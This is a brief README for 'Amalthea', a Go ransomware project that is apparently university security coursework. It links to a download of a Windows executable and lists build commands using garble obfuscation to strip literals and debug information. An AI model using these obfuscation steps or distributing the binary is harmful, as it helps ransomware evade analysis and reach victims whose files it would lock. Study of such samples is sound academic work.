# Amalthea Ransomware
## Developer for IY3D602 - Advanced Systems Security

* Download: https://cyber.lol/dl/Amalthea.exe
  
    _Compile Arguments:_

    * Obfuscated: `env GOOS=windows GOARCH=amd64 garble -seed=random -literals -debugdir=out build .`
    * Obfuscated with tiny: `env GOOS=windows GOARCH=amd64 garble -tiny -seed=random -literals -debugdir=out build .`
    * Normal: `env GOOS=windows GOARCH=amd64 go build .`
* Notes on `-tiny`
    > When the -tiny flag is passed, extra information is stripped from the resulting Go binary.
    > This includes line numbers, filenames, and code in the runtime the prints panics, fatal errors, and trace/debug info.
